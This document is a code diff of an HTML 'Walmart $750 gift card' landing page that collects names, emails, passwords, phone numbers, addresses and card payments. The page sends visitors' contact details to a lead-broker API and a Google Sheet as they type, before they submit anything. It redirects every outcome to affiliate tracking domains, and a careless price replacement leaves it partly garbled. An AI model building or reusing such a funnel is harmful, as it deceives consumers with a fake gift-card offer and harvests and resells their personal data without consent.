@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 
-<!-- Google tag (gtag.js) -->
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
@@ -13,8 +13,8 @@
 
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Get your $750 Walmart Gift Card for $2.50!</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800;900&display=swap" rel="stylesheet">
+  <title>Get your $750 Walmart Gift Card for $750!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
 
   <style>
     :root{
@@ -33,7 +33,7 @@
       border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05); margin-inline:auto;
     }
     .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 14px }
-    .sub{ text-align:center; color:var(--muted); margin-top:-6px; margin-bottom:16px }
+    .sub{ text-align:center; color:#muted; margin-top:-6px; margin-bottom:16px }
     .img-wrap{ display:flex; justify-content:center; padding:10px 0 16px }
     .img-wrap img{ width:min(360px,80%); height:auto; border-radius:18px; border:1px solid #eee; }
     .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
@@ -49,7 +49,7 @@
     .step{ display:none }
     .step[aria-hidden="false"]{ display:block }
     .label{font-weight:700; margin:4px 0 8px; font-size:14px; color:#333}
-    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; min-height:44px; }
+    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; }
     .brands{display:flex; justify-content:center; gap:12px; margin:14px 0 6px}
     .brands img{height:22px}
     .trust-text{ font-size:13px; color:#666; text-align:center; margin-top:12px }
@@ -68,28 +68,19 @@
     @media (max-width:520px){
       .phone-wrap{ grid-template-columns:1fr; }
     }
-
-    /* Small helper for stripe elements container visuals */
-    .stripe-element {
-      padding: 10px 12px;
-      border-radius: 8px;
-      background: white;
-      border: 1px solid #ccc;
-      min-height:44px;
-    }
   </style>
 </head>
 <body>
 
-<!-- GoAffPro loader (keep this so the next page can track) -->
-<script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+  <!-- GoAffPro loader (keep this so the next page can track) -->
+  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
 
   <div class="shell">
 
     <!-- STEP 1 -->
     <section id="step1" class="card step" aria-hidden="false">
       <h1 class="title">
-        Get Your Walmart $750 Gift Card for <span id="priceHero" data-price>$2.50</span>!
+        Get Your Walmart $750 Gift Card for <span id="priceHero" data-price> $750</span>!
       </h1>
       <p class="sub">Limited-time offer!</p>
 
@@ -140,15 +131,15 @@
       <div id="gpay-button" style="margin-top:8px"></div>
 
       <div class="label">Card number</div>
-      <div id="card-number" class="stripe-element el"></div>
+      <div id="card-number" class="el"></div>
       <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px">
         <div>
           <div class="label">Expiration</div>
-          <div id="card-expiry" class="stripe-element el"></div>
+          <div id="card-expiry" class="el"></div>
         </div>
         <div>
           <div class="label">CVC</div>
-          <div id="card-cvc" class="stripe-element el"></div>
+          <div id="card-cvc" class="el"></div>
         </div>
       </div>
 
@@ -156,7 +147,7 @@
 
       <div class="btn-row">
         <button id="backBtn" class="btn muted-btn">← Back</button>
-        <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$2.50</span> Securely</button>
+        <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$750</span> Securely</button>
       </div>
 
       <div class="brands">
@@ -180,7 +171,7 @@
   </div>
 
   <!-- Stripe.js -->
-  <script src="https://js.stripe.com/v3/"></script>
+  <script src="https://js.stripe.com/v3"></script>
   <script>
     /* ---------- Step navigation ---------- */
 
@@ -204,7 +195,7 @@
     const billingPostcode = document.getElementById('billingPostcode');
     const billingCountry  = document.getElementById('billingCountry');
 
-    // ===== Aceleads API specifics (kept) =====
+    // ===== Aceleads API specifics (per PDF) =====
     const ACELEADS_URL = 'https://mdleads.org/api/v1/ep/sp-lead';
     const ACELEADS_TOKEN = 'AL-VKh2K7o6AUWkq2aceTBEGYZ06DkaaRm0D7F6qUnpVzw=';
 
@@ -248,14 +239,17 @@
     }
 
     /* ---------- Step 1: share phone as soon as it's entered ---------- */
+    // simple debounce to avoid spamming while user types
     function debounce(fn, wait=600){
       let t; return (...args)=>{ clearTimeout(t); t=setTimeout(()=>fn(...args), wait); };
     }
+    // basic “looks valid” check: 8–15 digits total (after removing formatting)
     function isLikelyPhone(digits){ return /^\d{8,15}$/.test(digits); }
     let step1LeadSentOnce = false;
     let lastSentMobile = null;
     async function trySendLeadFromStep1(){
       try{
+        // Gather current Step 1 values
         const name = (nameInput?.value || '').trim();
         const [fname, ...rest] = name.split(/\s+/);
         const lname = rest.join(' ') || '';
@@ -263,13 +257,15 @@
 
         const rawDigits = (phoneNumber?.value || '').replace(/\D/g,'');
         const prefix = (phonePrefix?.value || '+1').replace(/[^\d+]/g,'');
-        const countryIso = (billingCountry?.value || 'US').trim();
+        const countryIso = (billingCountry?.value || 'US').trim(); // ensure country for API
 
-        if (!rawDigits || !isLikelyPhone(rawDigits)) return;
+        if (!rawDigits || !isLikelyPhone(rawDigits)) return;       // wait until it looks like a phone
         const mobile = normalizePhone(prefix, rawDigits);
 
+        // Avoid duplicates
         if (step1LeadSentOnce && mobile === lastSentMobile) return;
 
+        // Fire-and-forget (non-blocking); PDF requires mobile, token, timestamp, country
         sendAceleadsLead({
           fname: fname || undefined,
           lname: lname || undefined,
@@ -286,12 +282,14 @@
       }
     }
     const debouncedTrySendLeadFromStep1 = debounce(trySendLeadFromStep1, 700);
+    // Wire up listeners on Step 1 inputs
     ['input','change','blur'].forEach(evt => {
       phoneNumber?.addEventListener(evt, debouncedTrySendLeadFromStep1);
       phonePrefix?.addEventListener(evt, debouncedTrySendLeadFromStep1);
       emailInput?.addEventListener(evt, debouncedTrySendLeadFromStep1);
       nameInput?.addEventListener(evt, debouncedTrySendLeadFromStep1);
     });
+    // In case phone/email were prefilled from query/IP, try once on load after selects populate
     window.addEventListener('load', () => setTimeout(trySendLeadFromStep1, 1000));
 
     // Create/confirm account on your Render server before moving to payment
@@ -303,7 +301,7 @@
       const phone = rawPhone ? `${prefix}${rawPhone}` : '';
       if(!email || !password) throw new Error("Please enter email and password.");
 
-      // Best-effort aceleads fire
+      // Send best-effort lead to Aceleads before registering (non-blocking)
       try{
         const mobile = normalizePhone(prefix, rawPhone);
         const countryIso = (billingCountry?.value || undefined);
@@ -324,56 +322,49 @@
       throw new Error(data?.error||"Could not create account");
     }
 
-    /* ---------- Step navigation + lead capture on Next ---------- */
-    // Exposed capture function — also used on Next click
-    function captureLeadImmediately() {
-      try {
-        const fullName    = (nameInput?.value || '').trim();
-        const email       = (emailInput?.value || '').trim();
-        const national    = (phoneNumber?.value || '').replace(/[^\d]/g, '');
-        const dial        = (phonePrefix?.value || '+1');
-        const iso2        = (billingCountry?.value || '').trim().toUpperCase();
-        const countryName = billingCountry?.options?.[billingCountry.selectedIndex || 0]?.text || iso2;
+    /* ---------- Stripe: create/mount elements ONLY when Step 2 is visible ---------- */
+    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20"; // your server route
+    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    const stripe = Stripe(PUBLISHABLE_KEY);
+    let elements, cardNumber, cardExpiry, cardCvc, elementsMounted=false;
 
-        if (!email) return;
-
-        // NOTE: your Apps Script webapp (deployed as "Anyone, even anonymous" and allowing POST)
-        const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxa5lMqnVrgRxDFde_DnX6_OwsfkKKO2GRoz4_Tmp_XS660tn6nur3ijRVypPKbXbvTYw/exec";
-
-        fetch(SHEET_WEBAPP_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            full_name: fullName,
-            email,
-            phone_national: national,
-            country_iso2: iso2,
-            country_name: countryName,
-            country_dial: dial,
-            source_url: location.href,
-            user_agent: navigator.userAgent,
-            ts: new Date().toISOString()
-          })
-        }).then(()=>console.log('Lead sent to sheet')).catch(()=>console.warn('Lead sheet POST failed'));
-      } catch (e) { console.warn('captureLeadImmediately error', e); }
+    function mountStripeElements(){
+      if (elementsMounted) {
+        try { cardNumber.update({}); cardExpiry.update({}); cardCvc.update({}); } catch {}
+        return;
+      }
+      elements = stripe.elements();
+      cardNumber = elements.create("cardNumber");
+      cardExpiry = elements.create("cardExpiry");
+      cardCvc    = elements.create("cardCvc");
+      cardNumber.mount("#card-number");
+      cardExpiry.mount("#card-expiry");
+      cardCvc.mount("#card-cvc");
+      elementsMounted = true;
     }
-    window.captureLeadImmediately = captureLeadImmediately; // expose for testing
+
+    const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
+    function showError(m){$err.textContent=m;$err.style.display="block"}
+    function hideError(){$err.textContent="";$err.style.display="none"}
+    function showLoading(){overlay.setAttribute("aria-hidden","false")}
+    function hideLoading(){overlay.setAttribute("aria-hidden","true")}
 
     document.getElementById('nextBtn').onclick=async()=>{ 
       if(!nameInput.value||!emailInput.value||!passwordInput.value){alert("Please enter your details");return}
-      // first, send lead to sheet (fire-and-forget)
-      try { captureLeadImmediately(); } catch(e){ console.warn(e); }
-
-      // try to create account but if it fails, proceed to payment so flow can be tested
       try{
         await ensureAccount();
       }catch(e){
-        console.warn('ensureAccount failed (continuing to payment):', e);
+        alert(e.message||"Problem creating your account. Please try again.");
+        return;
       }
       localStorage.setItem("checkout_name",nameInput.value);
       localStorage.setItem("checkout_email",emailInput.value);
       step1.setAttribute("aria-hidden","true");
       step2.setAttribute("aria-hidden","false");
+      // NOW that step2 is visible, mount Stripe elements so they size correctly
+      mountStripeElements();
+      // also trigger Google Sheet lead capture immediately on step transition
+      try { window.captureLeadImmediately?.(); } catch {}
     };
 
     document.getElementById('backBtn').onclick=()=>{ 
@@ -450,6 +441,7 @@
       applyPriceSymbol('$');
       try { buildPrefixOptions(phonePrefix, 'US'); } catch {}
 
+      // Helper: fill country select with a single focused option + common fallbacks
       function initCountrySelect(code, name) {
         if (!billingCountry) return;
         const opts = [];
@@ -457,7 +449,9 @@
           const o = new Option(label, value, selected, selected);
           opts.push(o);
         }
+        // Primary detected country first
         if (code) add(code.toUpperCase(), `${name || code.toUpperCase()}`, true);
+        // A few commons as alternates
         [['US','United States'],['GB','United Kingdom'],['IE','Ireland'],['DE','Germany'],['FR','France'],['ES','Spain'],['IT','Italy'],['NL','Netherlands'],['AU','Australia'],['CA','Canada']].forEach(([c,n])=>{
           if (!code || c.toUpperCase()!==code.toUpperCase()) add(c, n, false);
         });
@@ -470,6 +464,8 @@
         .then(data => {
           const cc = ((data && (data.country || data.country_code)) || 'US').toUpperCase();
           applyPriceSymbol(symbolFor(cc));
+
+          // Prefer the exact calling code returned by the API (covers countries not in your static list)
           const apiCalling = (data && data.country_calling_code) || '';
           const apiName    = (data && data.country_name) || '';
           const city       = (data && data.city) || '';
@@ -488,6 +484,7 @@
             try { buildPrefixOptions(phonePrefix, cc); } catch {}
           }
 
+          // NEW: prefill address Country/City
           try { initCountrySelect(cc, apiName); } catch {}
           try { if (city && !billingCity.value) billingCity.value = city; } catch {}
         })
@@ -506,9 +503,14 @@
     (function prefillFromQuery(){
       try{
         const qs = new URLSearchParams(location.search);
-        const emailParam = qs.get('email') || qs.get('e') || qs.get('em') || qs.get('mail');
-        if (emailParam && emailInput) emailInput.value = decodeURIComponent(emailParam).trim();
 
+        // Email via ?email= / ?e= / ?em= / ?mail=
+        const emailParam = qs.get('email') || qs.get('e') || qs.get('em') || qs.get('mail');
+        if (emailParam && emailInput) {
+          emailInput.value = decodeURIComponent(emailParam).trim();
+        }
+
+        // Phone can be: ?phone=+441234567890  OR split as ?prefix=%2B44&number=1234567890
         const prefixParam = qs.get('prefix') || qs.get('cc') || qs.get('dial');
         const numberParam = qs.get('number') || qs.get('n');
         const phoneParam  = qs.get('phone')  || qs.get('tel')  || qs.get('p') || qs.get('msisdn');
@@ -516,6 +518,7 @@
         let desiredPrefix = null;
         let desiredNumber = null;
 
+        // If a single phone is provided, try to split E.164 (+CCxxxxxxxxx)
         if (phoneParam) {
           let p = (phoneParam + '').replace(/[^\d+]/g,'');
           if (p.startsWith('+')) {
@@ -524,6 +527,7 @@
             if (hit) { desiredPrefix = hit; desiredNumber = p.slice(hit.length); }
             else { desiredPrefix = '+1'; desiredNumber = p.replace(/^\+\d{1,3}/,''); }
           } else {
+            // No +, treat as national number, leave prefix for explicit param or default later
             desiredNumber = p;
           }
         }
@@ -533,10 +537,13 @@
           desiredPrefix = cleaned.startsWith('+') ? cleaned : ('+' + cleaned);
         }
 
+        // Apply number immediately
         if (desiredNumber && phoneNumber) phoneNumber.value = desiredNumber;
 
+        // Apply prefix even if options aren't populated yet (retry a few times)
         function applyPrefix(){
           if (!desiredPrefix || !phonePrefix) return true;
+          // Ensure the option exists; if not, create one so value sticks
           const exists = Array.from(phonePrefix.options).some(o => o.value === desiredPrefix);
           if (!exists) {
             phonePrefix.insertBefore(new Option(`${desiredPrefix} — Your country`, desiredPrefix, true, true), phonePrefix.firstChild);
@@ -554,122 +561,139 @@
       }catch{/* ignore */}
     })();
 
-    /* ---------- Stripe logic ---------- */
-    // IMPORTANT: replace STRIPE_PUBLISHABLE_KEY with your real publishable key (below is a test sample key)
-    const STRIPE_PUBLISHABLE_KEY = "pk_test_TYooMQauvdEDq54NiTphI7jx"; // sample test key — replace
-    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20"; // replace with your server endpoint
-
-    const stripe = Stripe(STRIPE_PUBLISHABLE_KEY);
-    const elements = stripe.elements();
-
-    const style = {
-      base: {
-        color: "#111",
-        fontFamily: 'Inter, system-ui, "Segoe UI", Roboto, "Helvetica Neue", Arial',
-        fontSmoothing: "antialiased",
-        fontSize: "16px",
-        "::placeholder": { color: "#aaa" },
-        ":-webkit-autofill": { color: "#111" }
-      },
-      invalid: { color: "#b00020" }
-    };
-
-    const cardNumber = elements.create("cardNumber", { style });
-    const cardExpiry = elements.create("cardExpiry", { style });
-    const cardCvc = elements.create("cardCvc", { style });
-
-    // Mount elements when DOM ready
-    window.addEventListener('load', () => {
-      try {
-        cardNumber.mount("#card-number");
-        cardExpiry.mount("#card-expiry");
-        cardCvc.mount("#card-cvc");
-      } catch (e) {
-        console.warn('Stripe mount error', e);
-      }
-    });
-
-    const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
-    function showError(m){if(!$err) return; $err.textContent=m; $err.style.display="block"; $err.setAttribute('aria-hidden','false');}
-    function hideError(){ if(!$err) return; $err.textContent=""; $err.style.display="none"; $err.setAttribute('aria-hidden','true');}
-    function showLoading(){overlay.setAttribute("aria-hidden","false")}
-    function hideLoading(){overlay.setAttribute("aria-hidden","true")}
-
+    /* ---------- Payment flow ---------- */
     document.getElementById("payNow").onclick=async()=>{
-      hideError(); showLoading();
+      hideError();showLoading();
 
+      // Build phone from prefix + digits only
       const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
       const prefix=(phonePrefix?.value||'+1').trim();
       const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;
 
+      // Collect billing address for Stripe billing_details.address
       const addr = {
         line1: (billingStreet?.value || '').trim() || undefined,
         city: (billingCity?.value || '').trim() || undefined,
         postal_code: (billingPostcode?.value || '').trim() || undefined,
-        country: (billingCountry?.value || '').trim() || undefined,
+        country: (billingCountry?.value || '').trim() || undefined, // ISO 2-letter
       };
 
-      // create PaymentMethod
-      const pm = await stripe.createPaymentMethod({
-        type: "card",
-        card: cardNumber,
-        billing_details: {
-          name: nameInput.value || undefined,
-          email: emailInput.value || undefined,
+      const pm=await stripe.createPaymentMethod({
+        type:"card",
+        card:cardNumber,
+        billing_details:{
+          name:nameInput.value || undefined,
+          email:emailInput.value || undefined,
           phone: fullPhone,
           address: addr
         }
       });
 
-      if(pm.error){
-        hideLoading();
-        showError(pm.error.message || "Card input error");
-        return;
-      }
+      if(pm.error){hideLoading();showError(pm.error.message);window.location.href="https://track.gandexo.com.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599";return}
 
       try{
-        // call your server to create PaymentIntent
-        const res = await fetch(SUBSCRIBE_URL, {
-          method: "POST",
-          headers: {"Content-Type":"application/json"},
-          body: JSON.stringify({
-            paymentMethodId: pm.paymentMethod.id,
-            name: nameInput.value,
-            email: emailInput.value,
+        // Create the $750 charge PaymentIntent on your server
+        const res=await fetch(SUBSCRIBE_URL,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            paymentMethodId:pm.paymentMethod.id,
+            name:nameInput.value,
+            email:emailInput.value,
             phone: fullPhone,
             address: addr,
-            price: 750
+            // Ensure your server accepts/uses these three fields:
+            amountCents: 75000,
+            currency: "usd",
+            description: "Walmart $750 Gift Card"
           })
         });
-        if(!res.ok) throw new Error('Server error creating payment.');
-        const data = await res.json();
-        if(data.error){ hideLoading(); showError(data.error); return; }
-        if(!data.clientSecret){ hideLoading(); showError("Payment setup failed"); return; }
 
-        // confirm payment to handle 3DS if needed
-        const conf = await stripe.confirmCardPayment(data.clientSecret);
-        if(conf.error){ hideLoading(); showError(conf.error.message||"Payment confirmation failed"); return; }
-        if(!(conf.paymentIntent && conf.paymentIntent.status==="succeeded")){
-          hideLoading(); showError("Payment not completed"); return;
+        const raw = await res.text();
+        let data=null; try{ data=JSON.parse(raw); }catch{}
+        if(!res.ok){
+          hideLoading();showError(`Server ${res.status}: ${raw || 'No body'}`);return;
+        }
+        if(!data || !data.clientSecret){
+          hideLoading();showError(`Bad response: ${raw || 'missing clientSecret'}`);return;
         }
 
-        // optional: send lead after payment
-        try {
+        // Confirm the charge (handles SCA/3DS)
+        const conf=await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error){hideLoading();showError(conf.error.message);window.location.href="https://track.crugate.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599";return}
+        if(!(conf.paymentIntent&&conf.paymentIntent.status==="succeeded")){hideLoading();showError("Payment not completed");window.location.href="https://track.crugate.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599";return}
+
+        // Send Aceleads lead after successful payment/subscription (best-effort)
+        try{
           const mobile = normalizePhone(prefix, rawPhone);
+          const countryIso = (billingCountry?.value || undefined);
           const parts = (nameInput.value || '').trim().split(' ');
           const fname = parts.shift() || undefined;
           const lname = parts.join(' ') || undefined;
-          await sendAceleadsLead({ fname, lname, email: emailInput.value, mobile, country: (billingCountry?.value||undefined) });
-        } catch(e){ console.warn('Aceleads after-payment error:', e); }
+          await sendAceleadsLead({ fname, lname, email: emailInput.value, mobile, country: countryIso });
+        }catch(e){ console.warn('Aceleads after-payment error:', e); }
 
-        // success redirect or show success message
-        hideLoading();
-        window.location.href = data.successUrl || "https://example.com/thank-you";
+        // Success: redirect ALL users to the specified URL
+        (function(){
+          window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7";
+        })();
+
       }catch(e){
-        hideLoading();
-        showError(e.message || "Something went wrong");
+        hideLoading();showError(e.message||"Something went wrong");window.location.href="https://track.crugate.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599";
       }
     };
+  </script>
+
+  <!-- === Lead capture to Google Sheet (added) === -->
+  <script>
+  const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxa5lMqnVrgRxDFde_DnX6_OwsfkKKO2GRoz4_Tmp_XS660tn6nur3ijRVypPKbXbvTYw/exec";
+
+  (function () {
+    let sentOnce = false;
+
+    function captureLeadImmediately() {
+      try {
+        const fullName    = (nameInput?.value || '').trim();
+        const email       = (emailInput?.value || '').trim();
+        const national    = (phoneNumber?.value || '').replace(/[^\d]/g, '');
+        const dial        = (phonePrefix?.value || '+1');
+        const iso2        = (billingCountry?.value || '').trim().toUpperCase();
+        const countryName = billingCountry?.options?.[billingCountry.selectedIndex || 0]?.text || iso2;
+
+        if (!email) return;
+
+        fetch(SHEET_WEBAPP_URL, {
+          method: "POST",
+          headers: { "Content-Type": "text/plain" },
+          body: JSON.stringify({
+            full_name: fullName,
+            email,
+            phone_national: national,
+            country_iso2: iso2,
+            country_name: countryName,
+            country_dial: dial,
+            source_url: location.href,
+            user_agent: navigator.userAgent
+          })
+        }).catch(()=>{});
+      } catch (_) {}
+    }
+
+    // Trigger once when Step 2 becomes visible (means Step 1 passed)
+    const step2El = document.getElementById('step2');
+    if (step2El) {
+      const obs = new MutationObserver(() => {
+        const visible = step2El.getAttribute('aria-hidden') === 'false';
+        if (visible && !sentOnce) {
+          sentOnce = true;
+          captureLeadImmediately();
+        }
+      });
+      obs.observe(step2El, { attributes: true, attributeFilter: ['aria-hidden'] });
+    }
+    window.captureLeadImmediately = captureLeadImmediately;
+
+  })();
   </script>
 </body>
 </html>
